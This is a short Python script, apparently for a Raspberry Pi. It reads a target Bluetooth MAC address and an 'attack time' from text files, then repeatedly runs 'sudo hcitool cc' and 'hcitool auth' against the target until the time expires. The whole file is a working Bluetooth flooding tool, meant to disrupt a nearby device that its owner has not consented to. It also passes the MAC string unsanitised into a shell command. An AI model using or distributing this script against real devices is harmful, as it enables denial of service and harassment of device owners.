# I got all in /home/pi - change directories if put somewhere else
import time
import os

path = 'mac.txt'
mac_file = open(path, 'r')
attackmac = mac_file.read()

path = 'attacktime.txt'
atk_file = open(path, 'r')
attacktime = atk_file.read()
attacktimeint = int(attacktime)

timeout = time.time() + attacktimeint
while True:
    os.system("sudo hcitool cc --role=m "+ attackmac)
    os.system("sudo hcitool auth "+ attackmac )
    if time.time() > timeout:
        break
